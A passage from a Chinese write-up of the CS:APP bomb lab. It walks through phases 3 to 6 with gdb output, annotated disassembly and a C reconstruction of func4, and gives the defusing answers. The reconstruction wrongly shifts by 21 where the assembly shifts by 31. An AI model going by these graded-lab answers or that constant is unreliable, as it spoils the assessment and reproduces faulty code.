title="注解p3_2"></a>注解p3_2</h4><p><strong>每个(ax*8+0x402470)中储存的地址</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">(gdb) print *(int**)  (0x402470+8*0)</span><br><span class="line">$11 &#x3D; (int *) 0x400f7c &lt;phase_3+57&gt;</span><br><span class="line"></span><br><span class="line">(gdb) print *(int**)  (0x402470+8*1)</span><br><span class="line">$12 &#x3D; (int *) 0x400fb9 &lt;phase_3+118&gt;</span><br><span class="line"></span><br><span class="line">(gdb) print *(int**)  (0x402470+8*2)</span><br><span class="line">$13 &#x3D; (int *) 0x400f83 &lt;phase_3+64&gt;</span><br><span class="line"></span><br><span class="line">(gdb) print *(int**)  (0x402470+8*3)</span><br><span class="line">$14 &#x3D; (int *) 0x400f8a &lt;phase_3+71&gt;</span><br><span class="line"></span><br><span class="line">(gdb) print *(int**)  (0x402470+8*4)</span><br><span class="line">$15 &#x3D; (int *) 0x400f91 &lt;phase_3+78&gt;</span><br><span class="line"></span><br><span class="line">(gdb) print *(int**)  (0x402470+8*5)</span><br><span class="line">$16 &#x3D; (int *) 0x400f98 &lt;phase_3+85&gt;</span><br><span class="line"></span><br><span class="line">(gdb) print *(int**)  (0x402470+8*6)</span><br><span class="line">$17 &#x3D; (int *) 0x400f9f &lt;phase_3+92&gt;</span><br><span class="line"></span><br><span class="line">(gdb) print *(int**)  (0x402470+8*7)</span><br><span class="line">$18 &#x3D; (int *) 0x400fa6 &lt;phase_3+99&gt;</span><br></pre></td></tr></table></figure><h3 id="Phase-4"><a href="#Phase-4" class="headerlink" title="Phase_4"></a>Phase_4</h3><ul><li>输入: *input</li><li>功能: 与两个数字比较, 相同则炸弹拆除</li><li>调用: __isoc99_sscanf</li><li>返回: 无</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">%rdi &amp;input</span><br><span class="line">Dump of assembler code for function phase_4:</span><br><span class="line">    0x000000000040100c &lt;+0&gt;:sub    $0x18,%rsp               &#x2F;&#x2F;扩栈18</span><br><span class="line">    0x0000000000401010 &lt;+4&gt;:lea    0xc(%rsp),%rcx           &#x2F;&#x2F;cx 栈12   数2</span><br><span class="line">    0x0000000000401015 &lt;+9&gt;:lea    0x8(%rsp),%rdx           &#x2F;&#x2F;dx 栈8    数1</span><br><span class="line">    0x000000000040101a &lt;+14&gt;:mov    $0x4025cf,%esi           &#x2F;&#x2F;si &#x3D; 0x4025cf</span><br><span class="line">    0x000000000040101f &lt;+19&gt;:mov    $0x0,%eax                &#x2F;&#x2F;ax &#x3D; 0</span><br><span class="line">    0x0000000000401024 &lt;+24&gt;:callq  0x400bf0 &lt;__isoc99_sscanf@plt&gt;   &#x2F;&#x2F;读取</span><br><span class="line">    0x0000000000401029 &lt;+29&gt;:cmp    $0x2,%eax                &#x2F;&#x2F;读入2个数字</span><br><span class="line">    0x000000000040102c &lt;+32&gt;:jne    0x401035 &lt;phase_4+41&gt;    &#x2F;&#x2F;读入个数!&#x3D;2,炸</span><br><span class="line">    0x000000000040102e &lt;+34&gt;:cmpl   $0xe,0x8(%rsp)           &#x2F;&#x2F;数1 与 14比较</span><br><span class="line">    0x0000000000401033 &lt;+39&gt;:jbe    0x40103a &lt;phase_4+46&gt;    &#x2F;&#x2F;数1 &lt;&#x3D;14 转46</span><br><span class="line">    0x0000000000401035 &lt;+41&gt;:callq  0x40143a &lt;explode_bomb&gt;  &#x2F;&#x2F;数1 &gt;14 炸</span><br><span class="line">    0x000000000040103a &lt;+46&gt;:mov    $0xe,%edx                &#x2F;&#x2F;14赋给dx</span><br><span class="line">    0x000000000040103f &lt;+51&gt;:mov    $0x0,%esi                &#x2F;&#x2F;si &#x3D; 0</span><br><span class="line">    0x0000000000401044 &lt;+56&gt;:mov    0x8(%rsp),%edi           &#x2F;&#x2F;di 栈8    数1</span><br><span class="line">    0x0000000000401048 &lt;+60&gt;:callq  0x400fce &lt;func4&gt;         </span><br><span class="line">    0x000000000040104d &lt;+65&gt;:test   %eax,%eax                &#x2F;&#x2F;对于返回值ax</span><br><span class="line">    0x000000000040104f &lt;+67&gt;:jne    0x401058 &lt;phase_4+76&gt;    &#x2F;&#x2F;ax!&#x3D;0 转76 炸</span><br><span class="line">    0x0000000000401051 &lt;+69&gt;:cmpl   $0x0,0xc(%rsp)           &#x2F;&#x2F;栈12(数2) &#x3D;&#x3D; 0</span><br><span class="line">    0x0000000000401056 &lt;+74&gt;:je     0x40105d &lt;phase_4+81&gt;    &#x2F;&#x2F;不等炸,等拆</span><br><span class="line">    0x0000000000401058 &lt;+76&gt;:callq  0x40143a &lt;explode_bomb&gt;</span><br><span class="line">    0x000000000040105d &lt;+81&gt;:add    $0x18,%rsp</span><br><span class="line">    0x0000000000401061 &lt;+85&gt;:retq</span><br></pre></td></tr></table></figure><p>注:</p><ol><li>这一块代码还是比较好懂的. 0~32从input中取两个数字放入栈8 栈12 处, 如果不是<strong>两个</strong>数字的话直接炸</li><li>34~67 是对数1 检测, 首先数1必须&lt;=14, 否则炸. 然后对数1调用func4函数, 如果返回值!=0直接炸</li><li>69~85 是对数2 检测, 简单的令人发指. 不为0炸, 为0炸弹拆除.</li></ol><h3 id="func4"><a href="#func4" class="headerlink" title="func4"></a>func4</h3><ul><li>输入: rdi = 数1 rsi = ?   rdx = 0xe</li><li>功能: 对参数进行某种神秘操作, 返回某个值</li><li>调用:  func4</li><li>返回: 某个int</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">第一轮: rdi &#x3D; 数1 rsi &#x3D; 0   rdx &#x3D; 0xe </span><br><span class="line">Dump of assembler code for function func4:</span><br><span class="line">   0x0000000000400fce &lt;+0&gt;:    sub    $0x8,%rsp            &#x2F;&#x2F;栈扩8</span><br><span class="line">   0x0000000000400fd2 &lt;+4&gt;:    mov    %edx,%eax            &#x2F;&#x2F;ax &#x3D; dx</span><br><span class="line">   0x0000000000400fd4 &lt;+6&gt;:    sub    %esi,%eax            &#x2F;&#x2F;ax &#x3D; dx-si</span><br><span class="line">   0x0000000000400fd6 &lt;+8&gt;:    mov    %eax,%ecx            &#x2F;&#x2F;cx &#x3D; dx-si</span><br><span class="line">   0x0000000000400fd8 &lt;+10&gt;:shr    $0x1f,%ecx           &#x2F;&#x2F;逻辑右移 cx 31位 正0负1</span><br><span class="line">   0x0000000000400fdb &lt;+13&gt;:add    %ecx,%eax            &#x2F;&#x2F;ax +&#x3D; cx</span><br><span class="line">   0x0000000000400fdd &lt;+15&gt;:sar    %eax                 &#x2F;&#x2F;ax 算数右移1位</span><br><span class="line">   0x0000000000400fdf &lt;+17&gt;:lea    (%rax,%rsi,1),%ecx   &#x2F;&#x2F;cx &#x3D; si + ax</span><br><span class="line">   0x0000000000400fe2 &lt;+20&gt;:cmp    %edi,%ecx            &#x2F;&#x2F;cx与数1比较 </span><br><span class="line">   0x0000000000400fe4 &lt;+22&gt;:jle    0x400ff2 &lt;func4+36&gt;  &#x2F;&#x2F;cx&lt;&#x3D;数1, 转36</span><br><span class="line">   0x0000000000400fe6 &lt;+24&gt;:lea    -0x1(%rcx),%edx      &#x2F;&#x2F;cx&gt;数1 dx &#x3D; cx-1</span><br><span class="line">   0x0000000000400fe9 &lt;+27&gt;:callq  0x400fce &lt;func4&gt;     &#x2F;&#x2F;调用func4 di&#x3D;数1,si&#x3D;si,dx&#x3D;cx-1</span><br><span class="line">   0x0000000000400fee &lt;+32&gt;:add    %eax,%eax            &#x2F;&#x2F;返回值ax*&#x3D;2</span><br><span class="line">   0x0000000000400ff0 &lt;+34&gt;:jmp    0x401007 &lt;func4+57&gt;  &#x2F;&#x2F;返回</span><br><span class="line">   0x0000000000400ff2 &lt;+36&gt;:mov    $0x0,%eax            &#x2F;&#x2F;上接22 ax &#x3D; 0</span><br><span class="line">   0x0000000000400ff7 &lt;+41&gt;:cmp    %edi,%ecx            &#x2F;&#x2F;比较cx 数1</span><br><span class="line">   0x0000000000400ff9 &lt;+43&gt;:jge    0x401007 &lt;func4+57&gt;  &#x2F;&#x2F;cx&gt;&#x3D;数1(也就是cx&#x3D;数1) 转57 返回 </span><br><span class="line">   0x0000000000400ffb &lt;+45&gt;:lea    0x1(%rcx),%esi       &#x2F;&#x2F;cx&lt;数1 si &#x3D; cx+1</span><br><span class="line">   0x0000000000400ffe &lt;+48&gt;:callq  0x400fce &lt;func4&gt;     &#x2F;&#x2F;调用func4 di&#x3D;数1,si&#x3D;si&#x3D;cx+1,dx&#x3D;dx</span><br><span class="line">   0x0000000000401003 &lt;+53&gt;:lea    0x1(%rax,%rax,1),%eax    &#x2F;&#x2F;ax&#x3D;2ax+1</span><br><span class="line">   0x0000000000401007 &lt;+57&gt;:add    $0x8,%rsp            </span><br><span class="line">   0x000000000040100b &lt;+61&gt;:retq</span><br></pre></td></tr></table></figure><p>这个函数折磨了我整整24h, 最终没忍住去搜了别人的题解. 下面这一段借鉴了<a href="https://www.jianshu.com/p/33eb51b2024e" target="_blank" rel="noopener">一位简书网友的这篇文章</a></p><p>对func4函数进行反汇编:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">fun4</span><span class="params">(<span class="keyword">int</span> x, <span class="keyword">int</span> v2, <span class="keyword">int</span> v3)</span></span>&#123;</span><br><span class="line">    <span class="comment">/*  x = rdi(数1) </span></span><br><span class="line"><span class="comment">        v2 = rsi(初值0)</span></span><br><span class="line"><span class="comment">        v3 = rdx(初值e)*/</span></span><br><span class="line">    <span class="keyword">int</span> tmp = (v3 - v2) &gt;&gt; <span class="number">21</span>;    <span class="comment">//逻辑右移</span></span><br><span class="line">    <span class="keyword">int</span> re = ((v3 - v2) + tmp) &gt;&gt; <span class="number">1</span>; <span class="comment">//算数右移</span></span><br><span class="line">    tmp = v2 + re;</span><br><span class="line">    <span class="keyword">if</span>(tmp &lt;= x) &#123;</span><br><span class="line">        <span class="keyword">if</span>(tmp&gt;=x) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        re = fun4(x,tmp+<span class="number">1</span>,v3);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">2</span>*re+<span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        re = fun4(x,v2,tmp<span class="number">-1</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">2</span> * re;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>不妨再写个测试函数:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> <span class="keyword">const</span> *argv[])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt;= <span class="number">0xe</span> ; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span>(fun4(i, <span class="number">0x0</span>, <span class="number">0xe</span>)==<span class="number">0</span>)&#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">"%d\n"</span>,i);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>得到:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">0</span><br><span class="line">1</span><br><span class="line">3</span><br><span class="line">7</span><br></pre></td></tr></table></figure><p>当且仅当 x = 0,1,3,7 中某个值时,func会返回0.</p><h3 id="Phase-5"><a href="#Phase-5" class="headerlink" title="Phase_5"></a>Phase_5</h3><ul><li>输入: *input</li><li>功能: 根据 input 指向对象映射得出新字符串, 若新字符串与<code>flyers</code>相同则炸弹拆除</li><li>调用: strings_not_equal(); string_length</li><li>返回: 0</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line">%rdi &amp;input</span><br><span class="line">Dump of assembler code for function phase_5:</span><br><span class="line">    0x0000000000401062 &lt;+0&gt;:push   %rbx</span><br><span class="line">    0x0000000000401063 &lt;+1&gt;:sub    $0x20,%rsp</span><br><span class="line">    0x0000000000401067 &lt;+5&gt;:mov    %rdi,%rbx            &#x2F;&#x2F;rbx &#x3D; &amp;input</span><br><span class="line">    0x000000000040106a &lt;+8&gt;:mov    %fs:0x28,%rax        &#x2F;&#x2F;rax &#x3D; &amp;fs+28      详见注解p5_1</span><br><span class="line">    0x0000000000401073 &lt;+17&gt;:mov    %rax,0x18(%rsp)      &#x2F;&#x2F;栈18储存&amp;fs+28</span><br><span class="line">    0x0000000000401078 &lt;+22&gt;:xor    %eax,%eax            &#x2F;&#x2F;自我异或, 等价于ax置0</span><br><span class="line">    0x000000000040107a &lt;+24&gt;:callq  0x40131b &lt;string_length&gt; &#x2F;&#x2F;检测rdi的长度</span><br><span class="line">    0x000000000040107f &lt;+29&gt;:cmp    $0x6,%eax            </span><br><span class="line">    0x0000000000401082 &lt;+32&gt;:je     0x4010d2 &lt;phase_5+112&gt;   &#x2F;&#x2F;长度&#x3D;6 转112</span><br><span class="line">    0x0000000000401084 &lt;+34&gt;:callq  0x40143a &lt;explode_bomb&gt;  &#x2F;&#x2F;长度!&#x3D;6,炸</span><br><span class="line">    0x0000000000401089 &lt;+39&gt;:jmp    0x4010d2 &lt;phase_5+112&gt;</span><br><span class="line">    0x000000000040108b &lt;+41&gt;:movzbl (%rbx,%rax,1),%ecx       &#x2F;&#x2F;cx &#x3D; (ax+bx) &#x3D; input[ax]</span><br><span class="line">    0x000000000040108f &lt;+45&gt;:mov    %cl,(%rsp)               &#x2F;&#x2F;栈0 &#x3D; cl</span><br><span class="line">    0x0000000000401092 &lt;+48&gt;:mov    (%rsp),%rdx              &#x2F;&#x2F;dx &#x3D; 栈0</span><br><span class="line">    0x0000000000401096 &lt;+52&gt;:and    $0xf,%edx                &#x2F;&#x2F;dx^f 取后4位</span><br><span class="line">    0x0000000000401099 &lt;+55&gt;:movzbl 0x4024b0(%rdx),%edx      &#x2F;&#x2F;dx &#x3D; (0x4024b0+dx) 这里比较复杂,详见注解p5_2,p5_3</span><br><span class="line">    0x00000000004010a0 &lt;+62&gt;:mov    %dl,0x10(%rsp,%rax,1)    &#x2F;&#x2F;栈10+ax &#x3D; dl </span><br><span class="line">    0x00000000004010a4 &lt;+66&gt;:add    $0x1,%rax                &#x2F;&#x2F;ax+&#x3D;1</span><br><span class="line">    0x00000000004010a8 &lt;+70&gt;:cmp    $0x6,%rax                &#x2F;&#x2F;ax与6比较</span><br><span class="line">    0x00000000004010ac &lt;+74&gt;:jne    0x40108b &lt;phase_5+41&gt;    &#x2F;&#x2F;不为6 继续循环至41</span><br><span class="line">    &#x2F;&#x2F;对输入的每个字符依次运算,根据运算结果取出特定内存中的字符,依次存储在栈10~栈16处</span><br><span class="line">    0x00000000004010ae &lt;+76&gt;:movb   $0x0,0x16(%rsp)          &#x2F;&#x2F;栈16&#x3D;0</span><br><span class="line">    0x00000000004010b3 &lt;+81&gt;:mov    $0x40245e,%esi           &#x2F;&#x2F;si&#x3D;0x40245e</span><br><span class="line">    0x00000000004010b8 &lt;+86&gt;:lea    0x10(%rsp),%rdi          &#x2F;&#x2F;di&#x3D;栈10</span><br><span class="line">    0x00000000004010bd &lt;+91&gt;:callq  0x401338 &lt;strings_not_equal&gt; &#x2F;&#x2F;栈10与0x40245e比较</span><br><span class="line">    0x00000000004010c2 &lt;+96&gt;:test   %eax,%eax                    &#x2F;&#x2F;对于ax (strings_not_equal的返回值)</span><br><span class="line">    0x00000000004010c4 &lt;+98&gt;:je     0x4010d9 &lt;phase_5+119&gt;       &#x2F;&#x2F;返回值1(不同) 炸 相同转119</span><br><span class="line">    0x00000000004010c6 &lt;+100&gt;:callq  0x40143a &lt;explode_bomb&gt;</span><br><span class="line">    0x00000000004010cb &lt;+105&gt;:nopl   0x0(%rax,%rax,1)</span><br><span class="line">    0x00000000004010d0 &lt;+110&gt;:jmp    0x4010d9 &lt;phase_5+119&gt;</span><br><span class="line">    0x00000000004010d2 &lt;+112&gt;:mov    $0x0,%eax                    &#x2F;&#x2F;ax置0</span><br><span class="line">    0x00000000004010d7 &lt;+117&gt;:jmp    0x40108b &lt;phase_5+41&gt;        &#x2F;&#x2F;转41</span><br><span class="line">    0x00000000004010d9 &lt;+119&gt;:mov    0x18(%rsp),%rax              &#x2F;&#x2F;ax&#x3D;栈18</span><br><span class="line">    0x00000000004010de &lt;+124&gt;:xor    %fs:0x28,%rax                &#x2F;&#x2F;栈18 与fs+28异或</span><br><span class="line">    0x00000000004010e7 &lt;+133&gt;:je     0x4010ee &lt;phase_5+140&gt;       &#x2F;&#x2F;相同 转140 解决</span><br><span class="line">    0x00000000004010e9 &lt;+135&gt;:callq  0x400b30 &lt;__stack_chk_fail@plt&gt;</span><br><span class="line">    0x00000000004010ee &lt;+140&gt;:add    $0x20,%rsp</span><br><span class="line">    0x00000000004010f2 &lt;+144&gt;:pop    %rbx</span><br><span class="line">    0x00000000004010f3 &lt;+145&gt;:retq</span><br></pre></td></tr></table></figure><p>注:</p><ol><li>代码中+8~+17,+119~+133部分涉及到了对于段寄存器fs的操作, 这是进行了栈保护, 避免栈的缓冲区溢出.此处将金丝雀值(canary)存入栈18处, 并备份在fs段,结束时比较canary是否被修改, 并调用栈检查失败函数(__stack_chk_fail) . 更多参见教材3.10章缓冲区溢出部分.</li><li>24~34 检测输入字符串长度, 若!=6 直接炸</li><li>41~74 对串中的六个字符依次运算,根据运算结果取出特定内存中的映射字符,依次存储在栈10~栈16处</li><li>76~98 比较取出来的映射字符是否与地址 <code>0x40245e</code>中的字符串(flyers)一致, 相同则炸弹拆除.</li></ol><h4 id="注解p5-1"><a href="#注解p5-1" class="headerlink" title="注解p5_1"></a>注解p5_1</h4><p>​    fs段寄存器</p><p>​    8086CPU将内存分段，并设计了 4 个段寄存器，CS，DS，ES 和 SS，分别用于指令、数据、其它和堆栈。</p><p>​    FS、GS 是从 80386 开始增加的两个辅助段寄存器，没有全称，取名就是按字母序排在 CS、DS、ES 之后的。 </p><h4 id="注解p5-2"><a href="#注解p5-2" class="headerlink" title="注解p5_2"></a>注解p5_2</h4><p>char 类型占有1个字节(8bits)的空间, 代码中对于每个字符, 取后四位代码, 并加上0x4024b0得到映射字符的地址, 并将得到的映射字符存入栈中的对应位置.例如当字符串的第二个字符为O时, 会进行如下操作:</p><blockquote><p>字符<code>O</code>对应的ASCAII码为 <code>0x4f</code></p><p>取后四位代码 <code>0xf</code></p><p>得到映射字符的地址 <code>0x4024bf</code></p><p>访问该地址, 得到映射字符<code>l</code> , 并存入栈11处 (11是第二个字符对应栈中的位置)</p></blockquote><h4 id="注解p5-3"><a href="#注解p5-3" class="headerlink" title="注解p5_3"></a>注解p5_3</h4><p><strong><code>0x4024b0</code>附近存储的字符</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">(gdb) print (char) *(0x4024b0+0x0)</span><br><span class="line">$1 &#x3D; 109 &#39;m&#39;</span><br><span class="line">(gdb) print (char) *(0x4024b0+0x1)</span><br><span class="line">$2 &#x3D; 97 &#39;a&#39;</span><br><span class="line">(gdb) print (char) *(0x4024b0+0x2)</span><br><span class="line">$3 &#x3D; 100 &#39;d&#39;</span><br><span class="line">(gdb) print (char) *(0x4024b0+0x3)</span><br><span class="line">$4 &#x3D; 117 &#39;u&#39;</span><br><span class="line">(gdb) print (char) *(0x4024b0+0x4)</span><br><span class="line">$5 &#x3D; 105 &#39;i&#39;</span><br><span class="line">(gdb) print (char) *(0x4024b0+0x5)</span><br><span class="line">$6 &#x3D; 101 &#39;e&#39;</span><br><span class="line">(gdb) print (char) *(0x4024b0+0x6)</span><br><span class="line">$7 &#x3D; 114 &#39;r&#39;</span><br><span class="line">(gdb) print (char) *(0x4024b0+0x7)</span><br><span class="line">$8 &#x3D; 115 &#39;s&#39;</span><br><span class="line">(gdb) print (char) *(0x4024b0+0x8)</span><br><span class="line">$9 &#x3D; 110 &#39;n&#39;</span><br><span class="line">(gdb) print (char) *(0x4024b0+0x9)</span><br><span class="line">$10 &#x3D; 102 &#39;f&#39;</span><br><span class="line">(gdb) print (char) *(0x4024b0+0xa)</span><br><span class="line">$11 &#x3D; 111 &#39;o&#39;</span><br><span class="line">(gdb) print (char) *(0x4024b0+0xb)</span><br><span class="line">$12 &#x3D; 116 &#39;t&#39;</span><br><span class="line">(gdb) print (char) *(0x4024b0+0xc)</span><br><span class="line">$13 &#x3D; 118 &#39;v&#39;</span><br><span class="line">(gdb) print (char) *(0x4024b0+0xd)</span><br><span class="line">$14 &#x3D; 98 &#39;b&#39;</span><br><span class="line">(gdb) print (char) *(0x4024b0+0xe)</span><br><span class="line">$15 &#x3D; 121 &#39;y&#39;</span><br><span class="line">(gdb) print (char) *(0x4024b0+0xf)</span><br><span class="line">$16 &#x3D; 108 &#39;l&#39;</span><br></pre></td></tr></table></figure><p><strong><code>0x40245e</code> 储存的字符</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">(gdb) print (char*) 0x40245e</span><br><span class="line">$17 &#x3D; 0x40245e &quot;flyers&quot;</span><br></pre></td></tr></table></figure><p><strong>偶然发现的一个彩蛋</strong></p><p>回到 <code>0x4024b0</code>附近, 理论上可能映射到的字符地址应该是从 <code>0x4024b0</code>~<code>0x4024bf</code> , 但实际上<code>0x4024c0</code>以及后面有字符可以取到, 如果调用的不是查看地址对应的字符, 而是字符串的话, 会发现下面一段话:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">(gdb) print (char*) 0x4024b0</span><br><span class="line">$18 &#x3D; 0x4024b0 &lt;array&gt; &quot;maduiersnfotvbylSo you think you can stop the bomb with ctrl-c, do you?&quot;</span><br></pre></td></tr></table></figure><p>前16个字符就是我们用于解题的字符, 后面居然还有一句来自教授的吐槽LOL😂</p><h3 id="Phase-6"><a href="#Phase-6" class="headerlink" title="Phase_6"></a>Phase_6</h3><ul><li>输入: *input</li><li>功能: 输入六个数字</li><li>调用: read_six_numbers</li><li>返回: 0</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br></pre></td><td class="code"><pre><span class="line">%rdi &amp;input</span><br><span class="line">Dump of assembler code for function phase_6:</span><br><span class="line">   0x00000000004010f4 &lt;+0&gt;:push   %r14</span><br><span class="line">   0x00000000004010f6 &lt;+2&gt;:push   %r13</span><br><span class="line">   0x00000000004010f8 &lt;+4&gt;:push   %r12</span><br><span class="line">   0x00000000004010fa &lt;+6&gt;:push   %rbp</span><br><span class="line">   0x00000000004010fb &lt;+7&gt;:push   %rbx</span><br><span class="line">   0x00000000004010fc &lt;+8&gt;:sub    $0x50,%rsp</span><br><span class="line">   0x0000000000401100 &lt;+12&gt;:mov    %rsp,%r13</span><br><span class="line">   0x0000000000401103 &lt;+15&gt;:mov    %rsp,%rsi</span><br><span class="line">   0x0000000000401106 &lt;+18&gt;:callq  0x40145c &lt;read_six_numbers&gt;  &#x2F;&#x2F;读入6个数字</span><br><span class="line">   0x000000000040110b &lt;+23&gt;:mov    %rsp,%r14</span><br><span class="line">   0x000000000040110e &lt;+26&gt;:mov    $0x0,%r12d   </span><br><span class="line">   0x0000000000401114 